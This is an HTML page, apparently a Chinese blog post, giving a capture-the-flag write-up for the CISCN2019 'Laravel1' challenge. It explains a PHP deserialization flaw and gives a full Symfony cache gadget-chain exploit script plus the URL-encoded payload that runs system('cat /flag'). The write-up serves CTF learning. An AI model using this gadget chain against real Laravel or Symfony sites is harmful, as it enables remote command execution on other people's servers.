@@ -1,0 +1,286 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+<meta name="viewport"
+      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+
+    <meta name="author" content="Bantian">
+
+
+
+
+
+<title>CISCN2019 总决赛 Day1 Web4-Laravel1 | Hexo</title>
+
+
+
+    <link rel="icon" href="/favicon.ico">
+
+
+
+
+    <!-- stylesheets list from _config.yml -->
+    
+    <link rel="stylesheet" href="/css/style.css">
+    
+
+
+
+    <!-- scripts list from _config.yml -->
+    
+    <script src="/js/script.js"></script>
+    
+    <script src="/js/tocbot.min.js"></script>
+    
+
+
+
+    
+    
+        
+    
+
+
+<meta name="generator" content="Hexo 4.2.1"></head>
+<body>
+    <div class="wrapper">
+        <header>
+    <nav class="navbar">
+        <div class="container">
+            <div class="navbar-header header-logo"><a href="/">Bantian&#39;s Blog</a></div>
+            <div class="menu navbar-right">
+                
+                    <a class="menu-item" href="/archives">Archives</a>
+                
+                    <a class="menu-item" href="/categories">Categories</a>
+                
+                    <a class="menu-item" href="/tags">Tags</a>
+                
+                    <a class="menu-item" href="/about">About</a>
+                
+                <input id="switch_default" type="checkbox" class="switch_default">
+                <label for="switch_default" class="toggleBtn"></label>
+            </div>
+        </div>
+    </nav>
+
+    
+    <nav class="navbar-mobile" id="nav-mobile">
+        <div class="container">
+            <div class="navbar-header">
+                <div>
+                    <a href="/">Bantian&#39;s Blog</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
+                </div>
+                <div class="menu-toggle" onclick="mobileBtn()">&#9776; Menu</div>
+            </div>
+            <div class="menu" id="mobile-menu">
+                
+                    <a class="menu-item" href="/archives">Archives</a>
+                
+                    <a class="menu-item" href="/categories">Categories</a>
+                
+                    <a class="menu-item" href="/tags">Tags</a>
+                
+                    <a class="menu-item" href="/about">About</a>
+                
+            </div>
+        </div>
+    </nav>
+
+</header>
+<script>
+    var mobileBtn = function f() {
+        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
+        var mobileMenu = document.getElementById("mobile-menu");
+        if(toggleMenu.classList.contains("active")){
+           toggleMenu.classList.remove("active")
+            mobileMenu.classList.remove("active")
+        }else{
+            toggleMenu.classList.add("active")
+            mobileMenu.classList.add("active")
+        }
+    }
+</script>
+        <div class="main">
+            <div class="container">
+    
+    
+        <div class="post-toc">
+    <div class="tocbot-list">
+    </div>
+    <div class="tocbot-list-menu">
+        <a class="tocbot-toc-expand" onclick="expand_toc()">Expand all</a>
+        <a onclick="go_top()">Back to top</a>
+        <a onclick="go_bottom()">Go to bottom</a>
+    </div>
+</div>
+
+<script>
+    document.ready(
+        function () {
+            tocbot.init({
+                tocSelector: '.tocbot-list',
+                contentSelector: '.post-content',
+                headingSelector: 'h1, h2, h3, h4, h5',
+                collapseDepth: 1,
+                orderedList: false,
+                scrollSmooth: true,
+            })
+        }
+    )
+
+    function expand_toc() {
+        var b = document.querySelector(".tocbot-toc-expand");
+        tocbot.init({
+            tocSelector: '.tocbot-list',
+            contentSelector: '.post-content',
+            headingSelector: 'h1, h2, h3, h4, h5',
+            collapseDepth: 6,
+            orderedList: false,
+            scrollSmooth: true,
+        });
+        b.setAttribute("onclick", "collapse_toc()");
+        b.innerHTML = "Collapse all"
+    }
+
+    function collapse_toc() {
+        var b = document.querySelector(".tocbot-toc-expand");
+        tocbot.init({
+            tocSelector: '.tocbot-list',
+            contentSelector: '.post-content',
+            headingSelector: 'h1, h2, h3, h4, h5',
+            collapseDepth: 1,
+            orderedList: false,
+            scrollSmooth: true,
+        });
+        b.setAttribute("onclick", "expand_toc()");
+        b.innerHTML = "Expand all"
+    }
+
+    function go_top() {
+        window.scrollTo(0, 0);
+    }
+
+    function go_bottom() {
+        window.scrollTo(0, document.body.scrollHeight);
+    }
+
+</script>
+    
+
+    
+    <article class="post-wrap">
+        <header class="post-header">
+            <h1 class="post-title">CISCN2019 总决赛 Day1 Web4-Laravel1</h1>
+            
+                <div class="post-meta">
+                    
+                        Author: <a itemprop="author" rel="author" href="/">Bantian</a>
+                    
+
+                    
+                        <span class="post-time">
+                        Date: <a href="#">June 7, 2020&nbsp;&nbsp;11:33:57</a>
+                        </span>
+                    
+                    
+                </div>
+            
+        </header>
+
+        <div class="post-content">
+            <h4 id="考点"><a href="#考点" class="headerlink" title="考点"></a>考点</h4><p>laravel 框架反序列化审计</p>
+<h4 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h4><p>打开题目就能看到源码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//backup in source.tar.gz</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">App</span>\<span class="title">Http</span>\<span class="title">Controllers</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">IndexController</span> <span class="keyword">extends</span> <span class="title">Controller</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span><span class="params">(\Illuminate\Http\Request $request)</span></span>&#123;</span><br><span class="line">        $payload=$request-&gt;input(<span class="string">"payload"</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">empty</span>($payload))&#123;</span><br><span class="line">            highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            @unserialize($payload);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>提示源码在<code>source.tar.gz</code>中，直接下载下来。之前因为专门学习过laravel框架中存在的反序列化漏洞，分析过四五条POP链，绝大多数的入口都是<code>Illuminate\Broadcasting\PendingBroadcast</code>类的<code>__destruct()</code>方法，但是在该源码中，里面的<code>dispatch()</code>方法被注释掉了，所以该入口的就不可利用了。</p>
+<p><img src="/2020/06/07/[CISCN2019-%E6%80%BB%E5%86%B3%E8%B5%9B-Day1-Web4]-Laravel1/imgs/1.png" alt="1"></p>
+<p>但好在这个版本安装了<code>symfony</code>组件，在该组件的<code>Symfony\Component\Cache\Adapter\TagAwareAdapter</code>的<code>__destruct()</code>方法中还有一个入口。</p>
+<img src="/2020/06/07/[CISCN2019-%E6%80%BB%E5%86%B3%E8%B5%9B-Day1-Web4]-Laravel1/imgs/2.png" alt="2" style="zoom: 50%;">
+
+<p>因为之前已经分析过这个漏洞了，所以这里直接给出exp：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Symfony</span>\<span class="title">Component</span>\<span class="title">Cache</span>\<span class="title">Adapter</span> &#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">TagAwareAdapter</span> &#123;</span><br><span class="line">        <span class="title">private</span> $<span class="title">deferred</span>;</span><br><span class="line">        <span class="keyword">private</span> $pool;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($deferred, $pool)</span> </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;deferred = $deferred;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;pool = $pool;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Symfony</span>\<span class="title">Component</span>\<span class="title">Cache</span>\<span class="title">Adapter</span> &#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">ProxyAdapter</span> &#123;</span><br><span class="line">        <span class="title">private</span> $<span class="title">setInnerItem</span>;</span><br><span class="line">        <span class="keyword">private</span> $poolHash;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($func, $poolHash)</span> </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;setInnerItem = $func;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;poolHash = $poolHash;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Symfony</span>\<span class="title">Component</span>\<span class="title">Cache</span> &#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">CacheItem</span> &#123;</span><br><span class="line">        <span class="title">protected</span> $<span class="title">expiry</span>;</span><br><span class="line">        <span class="keyword">protected</span> $innerItem;</span><br><span class="line">        <span class="keyword">protected</span> $poolHash;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($expiry, $param, $poolHash)</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;expiry = $expiry;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;innerItem = $param;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;poolHash = $poolHash;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> &#123;</span><br><span class="line">    // <span class="title">find</span> <span class="title">the</span> <span class="title">flag</span> <span class="title">first</span></span><br><span class="line">    // $cacheItem = new Symfony\Component\Cache\CacheItem(1, 'ls / -al', 1);</span><br><span class="line">    $cacheItem = <span class="keyword">new</span> Symfony\Component\Cache\CacheItem(<span class="number">1</span>, <span class="string">'cat /flag'</span>, <span class="number">1</span>);</span><br><span class="line">    $proxyAdapter = <span class="keyword">new</span> Symfony\Component\Cache\Adapter\ProxyAdapter(<span class="string">'system'</span>, <span class="number">1</span>);</span><br><span class="line">    $tagAwareAdapter = <span class="keyword">new</span> Symfony\Component\Cache\Adapter\TagAwareAdapter(<span class="keyword">array</span>($cacheItem), $proxyAdapter);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> urlencode(serialize($tagAwareAdapter));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>得到</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?payload=</span><br><span class="line">O%<span class="number">3</span>A47%<span class="number">3</span>A%<span class="number">22</span>Symfony%<span class="number">5</span>CComponent%<span class="number">5</span>CCache%<span class="number">5</span>CAdapter%<span class="number">5</span>CTagAwareAdapter%<span class="number">22</span>%<span class="number">3</span>A2%<span class="number">3</span>A%<span class="number">7</span>Bs%<span class="number">3</span>A57%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span>Symfony%<span class="number">5</span>CComponent%<span class="number">5</span>CCache%<span class="number">5</span>CAdapter%<span class="number">5</span>CTagAwareAdapter%<span class="number">00</span>deferred%<span class="number">22</span>%<span class="number">3</span>Ba%<span class="number">3</span>A1%<span class="number">3</span>A%<span class="number">7</span>Bi%<span class="number">3</span>A0%<span class="number">3</span>BO%<span class="number">3</span>A33%<span class="number">3</span>A%<span class="number">22</span>Symfony%<span class="number">5</span>CComponent%<span class="number">5</span>CCache%<span class="number">5</span>CCacheItem%<span class="number">22</span>%<span class="number">3</span>A3%<span class="number">3</span>A%<span class="number">7</span>Bs%<span class="number">3</span>A9%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span>%<span class="number">2</span>A%<span class="number">00</span>expiry%<span class="number">22</span>%<span class="number">3</span>Bi%<span class="number">3</span>A1%<span class="number">3</span>Bs%<span class="number">3</span>A12%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span>%<span class="number">2</span>A%<span class="number">00</span>innerItem%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A9%<span class="number">3</span>A%<span class="number">22</span>cat+%<span class="number">2</span>Fflag%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A11%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span>%<span class="number">2</span>A%<span class="number">00</span>poolHash%<span class="number">22</span>%<span class="number">3</span>Bi%<span class="number">3</span>A1%<span class="number">3</span>B%<span class="number">7</span>D%<span class="number">7</span>Ds%<span class="number">3</span>A53%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span>Symfony%<span class="number">5</span>CComponent%<span class="number">5</span>CCache%<span class="number">5</span>CAdapter%<span class="number">5</span>CTagAwareAdapter%<span class="number">00</span>pool%<span class="number">22</span>%<span class="number">3</span>BO%<span class="number">3</span>A44%<span class="number">3</span>A%<span class="number">22</span>Symfony%<span class="number">5</span>CComponent%<span class="number">5</span>CCache%<span class="number">5</span>CAdapter%<span class="number">5</span>CProxyAdapter%<span class="number">22</span>%<span class="number">3</span>A2%<span class="number">3</span>A%<span class="number">7</span>Bs%<span class="number">3</span>A58%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span>Symfony%<span class="number">5</span>CComponent%<span class="number">5</span>CCache%<span class="number">5</span>CAdapter%<span class="number">5</span>CProxyAdapter%<span class="number">00</span>setInnerItem%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A6%<span class="number">3</span>A%<span class="number">22</span>system%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A54%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span>Symfony%<span class="number">5</span>CComponent%<span class="number">5</span>CCache%<span class="number">5</span>CAdapter%<span class="number">5</span>CProxyAdapter%<span class="number">00</span>poolHash%<span class="number">22</span>%<span class="number">3</span>Bi%<span class="number">3</span>A1%<span class="number">3</span>B%<span class="number">7</span>D%<span class="number">7</span>D</span><br></pre></td></tr></table></figure>
+
+<p>获得flag文件：</p>
+<p><img src="/2020/06/07/[CISCN2019-%E6%80%BB%E5%86%B3%E8%B5%9B-Day1-Web4]-Laravel1/imgs/3.png" alt="3"></p>
+<p>执行命令读取flag：</p>
+<p><img src="/2020/06/07/[CISCN2019-%E6%80%BB%E5%86%B3%E8%B5%9B-Day1-Web4]-Laravel1/imgs/4.png" alt="4"></p>
+<p>整个调用过程就是：</p>
+<p><img src="/2020/06/07/[CISCN2019-%E6%80%BB%E5%86%B3%E8%B5%9B-Day1-Web4]-Laravel1/imgs/10.png" alt="10"></p>
+
+        </div>
+
+        
+            <section class="post-copyright">
+                
+                    <p class="copyright-item">
+                        <span>Author:</span>
+                        <span>Bantian</span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>Permalink:</span>
+                        <span><a href="https://bantttian.github.io/2020/06/07/[CISCN2019-%E6%80%BB%E5%86%B3%E8%B5%9B-Day1-Web4]-Laravel1/">https://bantttian.github.io/2020/06/07/[CISCN2019-%E6%80%BB%E5%86%B3%E8%B5%9B-Day1-Web4]-Laravel1/</a></span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>License:</span>
+                        <span>Copyright (c) 2019 <a href="http://creativecommons.org/licenses/by-nc/4.0/" target="_blank" rel="noopener">CC-BY-NC-4.0</a> LICENSE</span>
+                    </p>
+                
+                
+                     <p class="copyright-item">
+                         <span>Slogan:</span>
+                         <span>早睡早起身体好</span>
+                     </p>
+                
+
+            </section>
+        
+        <section class="post-tags">
+            <div>
+                <span>Tag(s):</span>
+                <span class="tag">
+                    
+                    
+                        <a href="/tags/CTF/"># CTF</a>
+                    
+                        <a href="/tags/Web/"># Web</a>
+                    
+                        
+                </span>
+            </div>
+            <div>
+                <a href="javascript:window.history.back();">back</a>
+                <span>· </span>
+                <a href="/">home</a>
+            </div>
+        </section>
+        <section class="post-nav">
+            
+            
+            <a class="next" rel="next" href="/2020/06/06/CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day1-Web1-Dropbox/">CISCN2019 华北赛区 Day1 Web1-Dropbox</a>
+            
+        </section>
+
+
+    </article>
+</div>
+
+        </div>
+        <footer id="footer" class="footer">
+    <div class="copyright">
+        <span>© Bantian | Powered by <a href="https://hexo.io" target="_blank">Hexo</a> & <a href="https://github.com/Siricee/hexo-theme-Chic" target="_blank">Chic</a></span>
+    </div>
+</footer>
+
+    </div>
+</body>
+</html>
